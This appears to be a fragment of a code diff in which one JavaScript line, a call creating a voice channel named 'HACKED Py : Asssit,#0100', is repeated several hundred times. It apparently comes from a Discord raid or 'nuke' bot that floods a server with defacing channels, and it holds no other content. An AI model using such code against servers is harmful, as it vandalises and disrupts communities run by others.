+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
+m.createChannel('HACKED Py : Asssit,#0100', 'voice');
